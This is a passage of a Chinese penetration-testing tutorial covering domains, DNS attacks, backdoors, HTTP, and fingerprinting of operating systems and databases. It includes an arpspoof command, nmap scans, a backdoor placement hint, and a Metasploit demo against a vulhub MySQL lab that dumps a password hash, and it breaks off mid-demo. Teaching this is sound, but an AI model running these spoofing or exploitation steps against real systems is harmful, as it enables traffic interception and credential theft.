    <content type="html"><![CDATA[<h1 id="基础概念与信息收集"><a href="#基础概念与信息收集" class="headerlink" title="基础概念与信息收集"></a>基础概念与信息收集</h1><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2476579/1623307390451-79e7a71e-656c-4401-ae03-c817b38967cc.png?x-oss-process=image/resize,w_938,limit_0" alt="信息收集.png"></p><h2 id="1-基础概念"><a href="#1-基础概念" class="headerlink" title="1. 基础概念"></a>1. 基础概念</h2><h3 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h3><h4 id="域名-1"><a href="#域名-1" class="headerlink" title="域名"></a>域名</h4><p>互联网上某一台计算机或计算机组的名称，用于在数据传输时标识计算机的电子方位（有时也指地理位置）。</p><h4 id="网域名称系统"><a href="#网域名称系统" class="headerlink" title="网域名称系统"></a>网域名称系统</h4><p>网域名称系统（Domain Name System）有时也简称为域名（DNS），是互联网的一项核心服务，它作为可以将域名和 IP 地址相互映射的一个分布式数据库。</p><h4 id="二级域名或多级域名"><a href="#二级域名或多级域名" class="headerlink" title="二级域名或多级域名"></a>二级域名或多级域名</h4><p><strong>顶级域名</strong></p><p>又叫一级域名，一串字符串中间<strong>一个点</strong>隔开，例如baidu.com。顶级域名是互联网DNS等级之中的最高级的域，它保存于DNS根域的名字空间中。</p><p><strong>二级域名</strong></p><p>实际上就是一个一级域名以下的主机名，一串字符串中间<strong>两个点</strong>隔开，例如<a href="http://www.baidu.com.二级域名就是最靠近顶级域名左侧的字段./">www.baidu.com。二级域名就是最靠近顶级域名左侧的字段。</a></p><p><strong>三级域名</strong></p><p>二级域名的子域名,特征是包含三个点，例如mp.weixin.qq.com。</p><ul><li><p>渗透时域名扫描</p><p>进行渗透测试时，其主域名找不到漏洞时，就可以尝试去测试收集到的子域名，然后可以由此横向到主网站。</p><p>比如<u>layer子域名探测</u>。</p></li></ul><h4 id="同源规则"><a href="#同源规则" class="headerlink" title="同源规则"></a>同源规则</h4><p>如果域名或 <strong>IP 地址</strong>、<strong>端口</strong>与<strong>协议</strong>都相同，那么就会被判定为同源。</p><h3 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h3><h4 id="本地Hosts与DNS的关系"><a href="#本地Hosts与DNS的关系" class="headerlink" title="本地Hosts与DNS的关系"></a>本地Hosts与DNS的关系</h4><p>Hosts文件主要作用是定义IP地址和主机名的映射关系，是一个映射IP地址和主机名的规定。</p><p>Hosts文件是一个没有扩展名的系统文件，可以用记事本等工具打开，其作用就是将一些常用的网址域名与其对应的IP地址建立一个关联“数据库”，当用户在浏览器中输入一个需要登录的网址时，系统会<u>首先自动从Hosts文件中寻找对应的IP地址，一旦找到，系统会立即打开对应网页，如果没有找到，则系统会再将网址提交DNS域名解析服务器进行IP地址的解析</u>。</p><h4 id="CDN是什么-与DNS的关系"><a href="#CDN是什么-与DNS的关系" class="headerlink" title="CDN是什么?与DNS的关系?"></a>CDN是什么?与DNS的关系?</h4><p>CDN的全称是Content DeliveryNetwork，即内容分发网络。</p><p><strong>基本思路</strong></p><p>是尽可能避开互联网上有可能影响数据传输速度和稳定性的瓶颈和环节，使内容传输的更快、更稳定。</p><p>通过在网络各处放置节点服务器所构成的在现有的互联网基础之上的一层智能虚拟网络，CDN系统能够实时地根据网络流量和各节点的连接、负载状况以及到用户的距离和响应时间等综合信息将用户的请求重新导向离用户最近的服务节点上（单纯只使用DNS解析，直接PING就会显示出自己的真实IP，如果又使用CDN，PING出来的IP就不是用户的真实IP而是CDN服务器的IP节点。需要绕过CDN后去找真实IP地址。）</p><p><strong>使用CDN的目的</strong></p><p>使用户可就近取得所需内容，解决Internet网络拥挤的状况，提高用户访问网站的响应速度。</p><h4 id="常见的DNS安全攻击"><a href="#常见的DNS安全攻击" class="headerlink" title="常见的DNS安全攻击"></a>常见的DNS安全攻击</h4><ul><li><p><strong>DDoS攻击</strong></p><p>分布式拒绝服务攻击，可以使很多的计算机在同一时间遭受到攻击，使攻击的目标无法正常使用。攻击者可以伪造自己的DNS服务器地址，同时发送大量请求给其他服务器（频繁的DNS解析请求）。其他服务器的回复会被发送到被伪造服务器的真实地址（真实IP对应的受害者收到大量回复），造成该服务器无法处理请求而崩溃。攻击者同样可以通过利用DNS协议中存在的漏洞，恶意创造一个载荷过大的请求，造成目标DNS服务器崩溃。</p></li><li><p><strong>DNS缓存中毒（DNS欺骗）</strong></p><p>向DNS服务器<u>注入非法网络域名地址<strong>替换</strong>合法地址（修改合法URL在DNS服务器上的缓存为非法地址）</u>，将流量从合法服务器引导至虚假服务器上的攻击方式，而且以后响应的域名请求将会受黑客所控。<u>当这些非法地址进入DNS服务器缓存，用户的浏览器或者邮件服务器访问合法URL时就会自动跳转到DNS指定的非法地址</u>。这种攻击往往被归类为域欺骗攻击(pharming attack)，由此它会导致出现很多严重问题。首先，用户往往会以为登陆的是自己熟悉的网站，而它们却并不是。与钓鱼攻击采用非法URL不同的是，这种攻击使用的是合法的URL地址。</p></li><li><p><strong>域名劫持（DNS重定向）</strong></p><p>通过攻击域名解析服务器（DNS），或伪造域名解析服务器（DNS）的方法，<u>把目标网站域名解析到错误的地址从而实现用户无法访问目标网站的目的</u>。域名劫持一方面可能影响用户的上网体验，用户被引到假冒的网站进而无法正常浏览网页，而用户量较大的网站域名被劫持后恶劣影响会不断扩大；另一方面用户可能被诱骗到冒牌网站进行登录等操作导致泄露隐私数据。</p></li><li><p><strong>DNS查询嗅探</strong></p><p>利用对DNS的配置信息获取网络环境的信息，为之后的攻击做准备。</p><p>为此，需要对DNS服务器需要采取特别的安全保护措施，在防火墙网络中，分开设置内部DNS服务器和外部DNS服务器，连接外部服务的外部DNS服务器上不留有对外禁止访问的内部网络系统的服务器，做到内外网络服务器分割。</p></li><li><p><strong>ARP欺骗</strong></p><p><strong>ARP协议</strong></p><p>在一个局域网内，广播ARP请求包，通过交换机，到达目标IP地址的PC机，从而获取对方的MAC地址。获取到之后会将IP和MAC地址的对应关系存入ARP缓存表，减少大量广播，降低网络拥塞。</p><p>在网络中<u>产生大量的ARP通信量使网络阻塞</u>，攻击者只要持续不断的发出伪造的ARP响应包就能<u>更改目标主机ARP缓存中的IP-MAC条目</u>，造成网络中断或中间人攻击。</p><p>ARP攻击主要是<u>存在于局域网网络</u>中，局域网中若有一台计算机感染ARP病毒，则感染该ARP病毒的系统将会试图通过”ARP欺骗”手段<u>截获</u>所在网络内其它计算机的通信信息，并因此造成网内其它计算机的通信故障。</p><p>比如在攻击机上执行如下命令，就是在告诉主机192.168.42.236，网关192.168.42.2的MAC地址是我，这样网络中就会充斥着这个ARP响应包，使得主机192.168.42.236的网络请求发送到攻击机，无法上网。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -i eth0 -t 192.168.42.236 192.168.42.2</span><br></pre></td></tr></table></figure><p><img src="https://image.3001.net/images/20220708/1657258480_62c7c1f02aadba285df82.png!small" alt="1657258480_62c7c1f02aadba285df82.png!small"></p></li><li><p>本机劫持</p><p>本机的计算机系统被木马或流氓软件感染后，也可能会出现部分域名的访问异常。</p></li></ul><h3 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h3><ul><li><p>概念</p><p>指绕过安全控制而获取对程序或系统访问权的方法。最主要的目的就是方便以后再次秘密进入或者控制系统。</p></li><li><p>分类</p><p><strong>网页后门</strong></p><p>一般都是通过服务器上正常的web服务来构造自己的连接方式，便于控制网站，比如现在非常流行的ASP、cgi脚本后门等。</p><p><strong>线程插入后门</strong></p><p>利用系统自身的某个服务或者线程，将后门程序插入到其中（最流行）。</p><p><strong>扩展后门</strong></p><p>所谓的“扩展”，是指在功能上有大的提升，比普通的单一功能的后门有更强的使用性，这种后门本身就相当于一个小的安全工具包，能实现非常多的常驻见安全功能，适合新手使用。</p><p><strong>C&#x2F;S后门（客户端服务器后门）</strong></p><p>和传统的木马程序类似的控制方法，采用“客户端&#x2F;服务端”的控制方式，通过某种特定的访问方式来启动后门进而控制服务器。可以进行脱库、盗取信息。</p></li><li><p>特点</p><p>即使管理员通过改变所有密码之类的方法来提高安全性，仍然能再次侵入，使再次侵入被发现的可能性减至最低。大多数后门设法躲过日志，大多数情况下即使入侵者正在使用系统也无法显示他已在线。</p></li></ul><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><ul><li><p>WEB的组成框架模型</p><p>网站原码、操作系统、中间件（搭建平台，提供服务的）、数据库。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2476579/1622344095127-d9d0947b-81bf-401b-a94e-bdacc95887df.png" alt="image.png"></p></li><li><p>各个层面对应的安全测试</p><p><strong>通信层</strong></p><p>主要测试通信协议的安全，系统开放的端口，其中操作系统提供网络层和数据链路层协议，存在问题的可能性较小，一<u>般关注开源协议已存在漏洞即可，无需重点关注</u>。应用层服务与协议一般由产品形态决定，产品中可以自定义配置相关协议与参数，需要重点关注与测试。</p><p><strong>应用层</strong></p><p>应用层<u>包含开发人员开发代码，为整个安全测试的核心模块</u>。主要包括web安全测试，源码安全测试。其中web安全测试从web访问服务的维度，偏向黑盒，进行安全测试。源码安全测试从代码的维度，偏向白盒，进行安全测试。</p><p><strong>系统层</strong></p><p>主要测试操作系统安全，数据库服务安全，web服务器安全，以及其他一些中间件的安全。</p><p><strong>管理层</strong></p><p>主要包括产品资料的安全测试，安全策略制定，协调各个层面的安全测试以及安全风险的整体评估。</p></li></ul><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2476579/1623556578495-5a065dfe-3000-4bf3-b59f-ccc5acf2d6b8.png" alt="img"></p><h2 id="2-数据包扩展"><a href="#2-数据包扩展" class="headerlink" title="2. 数据包扩展"></a>2. 数据包扩展</h2><h3 id="http-x2F-https数据包"><a href="#http-x2F-https数据包" class="headerlink" title="http&#x2F;https数据包"></a>http&#x2F;https数据包</h3><ul><li><p><strong>概念</strong></p><p>HTTP协议是超文本传输协议的缩写，英文是Hyper Text Transfer Protocol。它是从WEB服务器传输超文本标记语言(HTML)到本地浏览器的传送协议。设计HTTP最初的目的是为了提供一种发布和接收HTML页面的方法。HTPP有多个版本，目前广泛使用的是HTTP&#x2F;1.1版本。</p></li><li><p><strong>原理</strong></p><p>HTTP是一个<u>基于TCP&#x2F;IP通信协议</u>来传递数据的协议，传输的数据类型为HTML文件、图片文件、查询结果等。HTTP协议<u>一般用于B&#x2F;S架构</u>，浏览器作为HTTP客户端通过URL向HTTP服务端即WEB服务器发送所有请求。</p></li><li><p><strong>特点</strong></p><p>http协议支持客户端&#x2F;服务端模式，也是一种请求&#x2F;响应模式的协议。</p><p><strong>简单快速</strong>：客户向服务器请求服务时，只需传送请求方法和路径。请求方法常用的有GET、HEAD、POST。</p><p><strong>灵活</strong>：HTTP允许传输任意类型的数据对象。传输的类型由Content-Type加以标记。</p><p><strong>无连接</strong>：限制每次连接只处理一个请求。服务器处理完请求，并收到客户的应答后，即断开连接，但是却不利于客户端与服务器保持会话连接，为了弥补这种不足，产生了两项记录http状态的技术，一个叫做Cookie,一个叫做Session。</p><p><strong>无状态</strong>：无状态是指协议对于事务处理没有记忆，服务器并不知道用户身份。如果后续处理需要前面的信息，则必须重传。（或者借助cookie</p></li></ul><h3 id="URI和URL的区别"><a href="#URI和URL的区别" class="headerlink" title="URI和URL的区别"></a>URI和URL的区别</h3><p>HTTP使用统一资源标识符（Uniform Resource Identifiers, URI）来传输数据和建立连接。</p><p><strong>URI</strong>：Uniform Resource Identifier 统一资源标识符。用来标示一个具体的资源，可以通过 URI 知道<strong>一个资源是什么</strong>。</p><p><strong>URL</strong>：Uniform Resource Location 统一资源定位符。用来定位具体的资源的，标示了一个具体的资源位置，即通过URL知道<strong>一个资源在哪里</strong>。互联网上的每个文件都有一个唯一的URL。</p><h3 id="HTTP报文组成"><a href="#HTTP报文组成" class="headerlink" title="HTTP报文组成"></a>HTTP报文组成</h3><p>HTTP报文由三部分组成：<strong>状态行</strong>(请求行 | 响应行)、<strong>首部</strong>、<strong>主体</strong>。</p><p><img src="https://image.3001.net/images/20190506/1557118215_5ccfbd07495da.jpg!small" alt="1-报文组成.jpg"></p><p>HTTP报文以状态行开始，跟在后面的是HTTP首部，首部由多个首部字段构成，每行一个首部字段；HTTP首部后是一个空行，然后是报文主体。</p><p><strong>状态行和首部</strong>中的每行都是以<strong>回车符</strong>(\r，%0d，CR)和<strong>换行符</strong>(\n，%0a，LF)结束，这是因为HTTP规范中行应该使用CRLF结束。另外，首部和主体之间由一空行隔开，或者可以理解为HTTP首部的最后一个字段有两个CRLF。</p><p>与状态行和首部不同的是，<strong>主体</strong>是可选的，也就是说报文中不一定要有主体；另外状态行和首部是ASCII文本，主体可包含文本或二进制数据。</p><p>HTTP报文分为请求报文和响应报文；请求报文向服务器传达请求，响应报文将请求的结果返回给客户端。以下两图，分别是请求报文以及响应报文的结构图。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220725143615464.png" alt="image-20220725143615464"></p><p><img src="https://image.3001.net/images/20190506/1557118227_5ccfbd1373c25.jpg!small" alt="2-请求报文结构图.jpg"></p><p>​<img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220725143723004.png" alt="image-20220725143723004"></p><p><img src="https://image.3001.net/images/20190506/1557118238_5ccfbd1e1e197.jpg!small" alt="3-响应报文结构图.jpg"></p><p>请求报文包括一下内容：</p><ol><li>请求头：一些键值对，浏览器与web服务器之间都可以发送，特殊的某种含义<br><strong>HOST</strong>：主机或域名地址<br><strong>Accept</strong>：指浏览器或其他客户可以接受的MIME文件格式，servlet可以根据它判断并返回适当的文件格式<br><strong>User-Agent</strong>：是客户浏览器名称<br><strong>Host</strong>：对应网址URL中的web名称和端口号<br><strong>Accept-Language</strong>：指出浏览器可以接受的语言种类，如en或者en-us，指英语<br><strong>connection</strong>：用来告诉服务器是否可以维持固定的HTTP连接、http是无连接的，HTTP&#x2F;1.1使用Keep-Alive为默认值，这样当浏览器需要多个文件时（比如一个HTML文件和相关的图形文件），不需要每次都建立连接<br><strong>Cookie</strong>：浏览器用这个属性向服务器发送Cookie。Cookie是在浏览器中寄存的小型数据体，他可以记载服务器相关的用户信息，也可以用来实现会话功能<br><strong>Referer</strong>：表明产生请求的网页URL，这个属性可以用来跟踪web请求是从什么网站来的。<br><strong>Content-Type</strong> ：用来表明request的内容类型，可以用HttpServeletRequest的getContentType()方法取得。<br><strong>Accept-Charset</strong>：指出浏览器可以接受的字符编码<br><strong>Accept-Encoding</strong>：指出浏览器可以接受的编码方式。编码方式不同于文件格式，它是为了压缩文件传递速度。浏览器在接收到web响应之后再解码，然后再检查文件格式</li><li>空行：请求头与请求体之间用一个空行分开<br>最后一个请求头标之后是空行，发送回车符和退行，通知服务器以下不再有头标</li><li>请求体：要发送的数据（一般post提交时候会用）<br>使用POST传送，最常使用的是Content-Type和Content-Length头标</li></ol><h3 id="常见请求方法"><a href="#常见请求方法" class="headerlink" title="常见请求方法"></a>常见请求方法</h3><p><strong>GET</strong>：请求指定的页面信息，并返回实体主体。</p><p><strong>POST</strong>：向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST请求可能会导致新的资源的建立和&#x2F;或已有资源的修改。post请求必须包含content-type和content-length请求头字段。</p><p><strong>HEAD</strong>：类似于get请求，只不过返回的响应中没有具体的内容，用于获取报头。</p><p><strong>PUT</strong>：从客户端向服务器传送的数据取代指定的文档的内容。</p><p><strong>DELETE</strong>：请求服务器删除指定的页面。</p><ul><li><p><strong>get和post的区别</strong></p><p>get请求：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220725144256107.png" alt="image-20220725144256107"></p><p>post请求：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220725144307854.png" alt="image-20220725144307854"></p><ul><li>编码和请求方式不同：get通过URL显式的请求，只能是ASCII码。post不会显示在URL，请求的参数存放在请求实体body中（例如提交表单或者上传文件），在报文内部，且编码不唯一；post比get更加安全；</li><li>请求的数据量不同：get请求的数据有限，不超过2k-4k（视浏览器而定），而post没有上限；</li><li>缓存性：get会进行缓存，而post没有；</li><li>可刷新性：get请求可刷新，由于有本地缓存，不会重复请求，而post请求在刷新时会重新提交请求；</li><li>get多用来查询，请求参数放在url中，不会对服务器上的内容产生作用；post请求可能会导致新的资源的建立和&#x2F;或已有资源的修改。</li></ul></li></ul><h3 id="HTTPS"><a href="#HTTPS" class="headerlink" title="HTTPS"></a>HTTPS</h3><p>HTTP很多信息是明文传输，因此不适合用来传输一些敏感信息，比如：各种账号、密码等信息，使用http协议传输隐私信息非常不安全。存在以下问题：</p><ul><li><p>请求信息明文传输，容易被窃听截取。（机密性）</p></li><li><p>数据的完整性未校验，容易被篡改。（完整性）</p></li><li><p>没有验证对方身份，存在冒充危险。（不可抵赖性）</p></li></ul><p>HTTPS 协议（HyperText Transfer Protocol over Secure Socket Layer）：一般理解为HTTP+SSL&#x2F;TLS，通过 SSL证书来验证服务器的身份（SSL安全套接字层位于传输层和应用层之间），并为浏览器和服务器之间的通信进行加密。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220725153139636.png" alt="image-20220725153139636"></p><ul><li><p><strong>HTTPS的缺点</strong></p><p>HTTPS协议多次握手，导致页面的加载时间延长近50%；</p><p>HTTPS连接缓存不如HTTP高效，会增加数据开销和功耗；</p><p>申请SSL证书需要钱，功能越强大的证书费用越高。</p><p>SSL涉及到的安全算法会消耗 CPU 资源，对服务器资源消耗较大。</p></li><li><p><strong>HTTP和HTTPS的区别</strong></p><ul><li><strong>申请证书</strong>：https协议需要到CA申请证书，一般免费证书较少，因而需要一定费用。</li><li><strong>传输数据</strong>：http是超文本传输协议，信息是明文传输，https则是具有安全性的ssl&#x2F;tls加密传输协议。</li><li><strong>端口</strong>：http和https使用的是完全不同的连接方式，用的端口也不一样，前者是80，后者是443。</li><li><strong>安全性</strong>：http的连接很简单，是无状态的；HTTPS协议是由SSL&#x2F;TLS+HTTP协议构建的可进行加密传输、身份认证的网络协议，比http协议安全。</li></ul></li></ul><h2 id="3-网站搭建安全"><a href="#3-网站搭建安全" class="headerlink" title="3. 网站搭建安全"></a>3. 网站搭建安全</h2><ul><li><p>搭建环境：ASP、PHP、ASPx、JSP、PY、JAVAWEB等环境。</p></li><li><p>WEB源码中敏感文件：后台路径，数据库配置文件，备份文件等</p></li><li><p>IP或域名解析存在的安全问题：在进行网站的目录扫描时，要注意域名访问的时候一般只会指向某个目录（<strong>网站所在目录</strong>），而IP访问的时候指向的是<strong>上一级根目录</strong>（包含更多文件，<u>特别是网站源码的备份文件</u>），<strong>域名和IP两者访问的路径是不同的</strong>。</p></li><li><p>常见安全测试中的安全防护：</p><p>（1）身份验证和访问控制，基于用户的限制（用户名密码、借助域控）</p><p>（2）限制IP地址的访问（黑名单或白名单）</p><p>（3）安全通信，使用客户端证书</p></li><li><p>后门是否给予执行权限</p><p>（1）设置相关权限，限制来宾用户的权限，导致连接了后门也看不到任何东西，它属于防护技巧，也是测试里经常碰到的问题；</p><p>（2）设置了执行权限，如果没有执行权限，文件不给执行，代码就无法正常执行，后门就无法正常使用</p></li></ul><p><strong>绕过思路</strong></p><p>将后门试着放在其他可以执行的目录。比如，网站根目录或者其他有脚本存放的目录下面。</p><p>判断网站中间件：</p><p>响应包的server字段会显示中间件。</p><h2 id="4-web源码安全"><a href="#4-web源码安全" class="headerlink" title="4. web源码安全"></a>4. web源码安全</h2><h2 id="5-系统及数据库安全"><a href="#5-系统及数据库安全" class="headerlink" title="5. 系统及数据库安全"></a>5. 系统及数据库安全</h2><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2476579/1623069570924-95f7c353-435e-4b3f-ba01-8380867963ab.png" alt="image.png"></p><h3 id="操作系统层面"><a href="#操作系统层面" class="headerlink" title="操作系统层面"></a>操作系统层面</h3><ul><li><p>识别操作系统</p><p><strong>方法一：</strong>网站路径修改大小写</p><p>windows对大小写不敏感，也就是说你在网页中可以替换网站路径的大小写进行测试；</p><p><strong>方法二：</strong>nmap扫描</p><p>没有网站可以用于测试时，可以使用nmap扫描主机，获得主机的一些信息。如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">──(root💀kali)-[~/桌面]</span><br><span class="line">└─# nmap -O 10.1.1.10 </span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-07 21:06 CST</span><br><span class="line">Nmap scan report for 10.1.1.10 (10.1.1.10)</span><br><span class="line">Host is up (0.0011s latency).</span><br><span class="line">Not shown: 999 closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">MAC Address: 00:0C:29:13:E9:61 (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br></pre></td></tr></table></figure><p>备注：不是所有的系统都可以用这种方式扫描出操作系统的类型、在windows的一些高版本中nmap也无法探测其操作系统类型。</p><p><strong>方法三：</strong>TTL值</p><p>不同的操作系统的默认TTL值（网络中数据包的生存周期，经过多少次路由后自动丢弃，经过一次路由就减一）是不同的， 所以我们可以通过TTL值来判断主机的操作系统，但是当用户在注册表中修改了TTL值的时候，就会误导我们的判断，所以这种判断方式也不一定准确。下面是默认操作系统的TTL：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">WINDOWS NT/2000   TTL：128</span><br><span class="line">WINDOWS 95/98     TTL：32</span><br><span class="line">UNIX              TTL：255</span><br><span class="line">LINUX             TTL：64</span><br><span class="line">WIN7           TTL：64</span><br></pre></td></tr></table></figure><p>比如，使用ping命令可以看到TTL为53，可以估计出TTL值原本为64，经过了11次路由。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\cbcao&gt;ping baidu.com</span><br><span class="line">正在 Ping baidu.com [110.242.68.66] 具有 32 字节的数据:</span><br><span class="line">来自 110.242.68.66 的回复: 字节=32 时间=42ms TTL=53</span><br><span class="line">来自 110.242.68.66 的回复: 字节=32 时间=42ms TTL=53</span><br><span class="line">来自 110.242.68.66 的回复: 字节=32 时间=42ms TTL=53</span><br><span class="line">来自 110.242.68.66 的回复: 字节=32 时间=42ms TTL=53</span><br></pre></td></tr></table></figure><p><strong>方法四</strong>：特殊端口 如（22 &#x2F; 139 &#x2F; 445 &#x2F; 1433 &#x2F; 3389）</p></li><li><p>识别操作系统的意义</p><p>不同操作系统对应着不同的漏洞、不同的利用条件。</p></li></ul><h3 id="数据库层面"><a href="#数据库层面" class="headerlink" title="数据库层面"></a>数据库层面</h3><ul><li><p>识别数据库的常见方法</p><p><strong>方法一</strong>：根据搭配的语言进行识别</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">默认的语言搭配的数据库</span><br><span class="line">组合类型 asp + access/mssql</span><br><span class="line">组合类型 php + mysql </span><br><span class="line">组合类型 aspx+mssql</span><br><span class="line">组合类型 jsp +mysql/oracle</span><br><span class="line">组合类型 Python + MongoDB</span><br></pre></td></tr></table></figure><p><strong>方法二</strong>：根据端口号进行识别</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">常见的数据库默认端口号</span><br><span class="line">关系型数据库</span><br><span class="line">  mysql3306</span><br><span class="line">  sqlserver1433</span><br><span class="line">  oracle1521</span><br><span class="line">  psotgresql5432</span><br><span class="line">非关系型数据库</span><br><span class="line">  MongoDB27017</span><br><span class="line">  Redis6379</span><br><span class="line">  memcached11211</span><br></pre></td></tr></table></figure></li><li><p>识别数据库的意义</p><p>数据库的不同表示的结构也是不同、写法结构也不一样、所以产生的漏洞也不一样。</p><p>不同的数据库的攻击方式也不完全一样。</p></li><li><p>数据库漏洞的影响</p><p>数据库权限、网站权限、修改网页内容</p></li><li><p>漏洞演示</p><p><a href="https://vulhub.org/#/environments/mysql/CVE-2012-2122/">https://vulhub.org/#/environments/mysql/CVE-2012-2122/</a></p><p>首先kali中进入metasploit：<code>msfconsole</code></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220725164309854.png" alt="image-20220725164309854"></p><p>然后搜索mysql漏洞：<code>search mysql</code></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220725204945302.png" alt="image-20220725204945302"></p><p>选择一个准备利用的漏洞，使用该模块：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220725205142250.png" alt="image-20220725205142250"></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220725205202105.png" alt="image-20220725205202105"></p><p>然后按照rhost选项配置攻击机IP、线程数threads，接着执行run即可：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220725205258549.png" alt="image-20220725205258549"></p><p>最后得到数据库密码的hash值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[+] 10.1.1.133:3306       - 10.1.1.133:3306 Saving HashString as Loot: root:*6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9</span><br><span class="line">[+] 10.1.1.133:3306       - 10.1.1.133:3306 Hash Table has been saved: /root/.msf4/loot/20210608111341_default_10.1.1.133_mysql.hashes_091970.txt</span><br><span class="line">[*] 10.1.1.133:3306       - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br><span class="line"></span><br><span class="line">md5在线解密</span><br><span class="line">https://www.cmd5.com/</span><br></pre></td></tr></table></figure><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220725205818311.png" alt="image-20220725205818311"></p></li></ul><h3 id="第三方层面"><a href="#第三方层面" class="headerlink" title="第三方层面"></a>第三方层面</h3><ul><li><p>如何判断有哪些第三方平台或软件：nmap</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">nmap -O -sV 10.1.1.130</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-08 09:26 CST</span><br><span class="line">Nmap scan report for 10.1.1.130 (10.1.1.130)</span><br><span class="line">Host is up (0.00085s latency).</span><br><span class="line">Not shown: 978 closed ports</span><br><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line">21/tcp   open  ftp         vsftpd 2.3.4</span><br><span class="line">22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)</span><br><span class="line">23/tcp   open  telnet      Linux telnetd</span><br><span class="line">25/tcp   open  smtp        Postfix smtpd</span><br><span class="line">80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)</span><br><span class="line">111/tcp  open  rpcbind     2 (RPC #100000)</span><br><span class="line">139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">512/tcp  open  exec?</span><br><span class="line">513/tcp  open  login?</span><br><span class="line">514/tcp  open  tcpwrapped</span><br></pre></td></tr></table></figure></li><li><p>识别第三方平台或软件的意义</p><p>不同的第三方软件或工具存在不同的漏洞、识别到更多的信息对收集到的漏洞也就越多。</p></li><li><p>渗透第三方平台或软件的目标</p><p>直接获取到软件的权限便于进一步的提权和攻击</p></li><li><p>漏洞演示</p><p><a href="https://vulhub.org/#/environments/phpmyadmin/CVE-2018-12613/">https://vulhub.org/#/environments/phpmyadmin/CVE-2018-12613/</a></p><p>首先进入该漏洞的目录，启动phpmyadmin：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@hdss7-11 CVE-2018-12613]# pwd</span><br><span class="line">/opt/vulhub/vulhub-master/phpmyadmin/CVE-2018-12613</span><br><span class="line">[root@hdss7-11 CVE-2018-12613]# 